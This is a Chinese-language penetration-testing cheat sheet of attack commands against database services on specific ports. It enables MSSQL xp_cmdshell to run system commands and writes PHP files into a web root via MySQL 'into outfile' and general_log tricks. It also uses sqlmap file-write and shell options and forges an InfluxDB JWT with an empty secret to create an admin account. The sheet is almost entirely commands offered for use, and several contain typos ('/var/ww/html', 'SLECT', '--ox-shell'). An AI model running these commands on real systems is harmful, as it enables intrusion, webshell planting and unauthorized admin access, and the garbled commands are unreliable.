# 端口服务测试

## 1433 MSSQL

```bash
# 查看 xp_cmdshell 开启状状态 0 Closed / 1 Opened
EXEC sp_configure 'xp_cmdshell';
GO

# 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXEC sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO

# 使用 xp_cmdshell 执行 whoami 命令
EXEC xp_cmdshell 'whoami';
GO
EXEC dbName..xp_cmdshell 'whoami';
GO

# 禁用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
GO
RECONFIGURE;
GO

# 执行外部 Python 脚本
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```

## 3306 MySQL

```bash
# 查询 secure_file_priv 值
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';

# into outfile 写入文件
select '<?php phpinfo(); ?>' into outfile '/var/ww/html/phpinfo.php';
sqlmap -u "URL" --file-write="/local/file" --file-dest="/remote/file"

# sqlmap GetShell
sqlmap -u "URL" --ox-shell

# 日志写入文件
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = "ON";
SET GLOBAL general_log_file="/var/www/html/shell.php";
SLECT '<?php phpinfo(); ?>';
```

## 8086 InfluxDB

```bash
# http://localhost:8086/debug/vars
# http://localhost:8086/query

# HEADER
{
  "alg": "HS256",
  "typ": "JWT"
}
# PAYLOAD
{
  "username": "admin",
  "exp": 2986346267
}
# VERIFY SIGNATURE
secret = null

Authorization: Bearer xxxxxxx

q=CREATE USER "influx" with PASSWORD '123456' WITH ALL PRIVILEGES;

# https://github.com/influxdata/chronograf
chronograf --influxdb-url="http://localhost:8086" --influxdb-username="influx" --influxdb-password="123456"

# Other commands
SHOW USERS # 查看所有账户
CREATE USER "influx" with PASSWORD '123456' WITH ALL PRIVILEGES; #创建管理员账户
DROP USER "influx" # 删除 influx 账户
SHOW DATABASES # 显示所有数据库
CREATE DATABASE "TestDB" # 创建 TestDB 数据库
USE "TestDB" # 使用数据库
SHOW measurements # 显示当前数据库中所有的表
DROP DATABASE "TestDB" # 删除 TestDB 数据库
```
